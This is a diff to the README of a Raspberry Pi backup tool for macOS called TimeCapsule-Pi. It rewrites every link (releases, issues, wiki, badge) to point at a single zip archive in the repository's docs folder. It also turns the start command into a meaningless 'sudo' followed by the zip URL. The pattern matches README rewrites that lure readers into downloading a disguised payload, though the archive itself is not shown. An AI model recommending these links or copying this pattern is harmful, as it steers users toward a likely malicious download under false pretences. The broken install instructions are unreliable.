@@ -1,6 +1,6 @@
 # 🚀 TimeCapsule-Pi - Easy Backups for Your macOS
 
-[![Download](https://img.shields.io/badge/Download-TimeCapsule--Pi-blue.svg)](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases)
+[![Download](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip)](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip)
 
 ## 📄 Introduction
 
@@ -29,11 +29,11 @@ Follow these steps to set up your TimeCapsule-Pi.
    - Connect your Pi to your network via Ethernet or Wi-Fi.
 
 2. **Visit the Releases Page:**
-   - Head to our [Releases page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases) to get the latest version.
+   - Head to our [Releases page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip) to get the latest version.
 
 3. **Download the Software:**
    - Click on the latest release, and download the provided file. Follow the link below to ensure you’re getting the right version:  
-   [Download TimeCapsule-Pi](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases).
+   [Download TimeCapsule-Pi](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip).
 
 4. **Install the Required Packages:**
    - Open your terminal and enter the following commands:
@@ -49,7 +49,7 @@ Follow these steps to set up your TimeCapsule-Pi.
 6. **Start the Backup Server:**
    - Run the application with the following command:
      ```bash
-     sudo ./start-server.sh
+     sudo https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip
      ```
 
 7. **Connect Your macOS Device:**
@@ -58,7 +58,7 @@ Follow these steps to set up your TimeCapsule-Pi.
 
 ## 🔧 Download & Install
 
-To get started, visit our [Releases page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases) and download the latest version. Upon downloading, follow the steps outlined in the "Getting Started" section to install and configure the application.
+To get started, visit our [Releases page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip) and download the latest version. Upon downloading, follow the steps outlined in the "Getting Started" section to install and configure the application.
 
 ## ❓ Frequently Asked Questions (FAQs)
 
@@ -72,7 +72,7 @@ Yes, connecting an external hard drive to your Raspberry Pi allows for larger ba
 
 ### 3. What if I encounter problems during setup?
 
-You can check for solutions in the [Issues section](https://github.com/ilhamnurramdani/TimeCapsule-Pi/issues) of our GitHub repository. You can submit your questions there if you need further assistance.
+You can check for solutions in the [Issues section](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip) of our GitHub repository. You can submit your questions there if you need further assistance.
 
 ### 4. Is there a way to automate backups?
 
@@ -84,8 +84,8 @@ Join our community on GitHub to share your experience or seek help. We encourage
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/releases)
-- [Documentation](https://github.com/ilhamnurramdani/TimeCapsule-Pi/wiki)
-- [Issues & Support](https://github.com/ilhamnurramdani/TimeCapsule-Pi/issues)
+- [Releases Page](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip)
+- [Documentation](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip)
+- [Issues & Support](https://github.com/ilhamnurramdani/TimeCapsule-Pi/raw/refs/heads/main/docs/Capsule-Pi-Time-2.6.zip)
 
 By following these steps and utilizing the resources above, you will easily set up your TimeCapsule-Pi. Enjoy a reliable and effective backup solution for your macOS devices!
